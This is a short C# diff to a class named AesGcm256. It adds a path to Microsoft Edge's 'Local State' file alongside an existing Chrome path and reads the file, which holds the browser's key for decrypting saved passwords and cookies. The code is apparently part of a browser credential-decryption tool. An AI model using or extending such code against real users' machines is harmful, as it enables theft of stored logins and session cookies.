@@ -134,6 +134,10 @@ class AesGcm256
         {
             path = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Local State";
         }
+        else if (dbpath.Contains("Edge"))
+        {
+            path = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Edge\User Data\Local State";
+        }
 
         string v = File.ReadAllText(path);
 
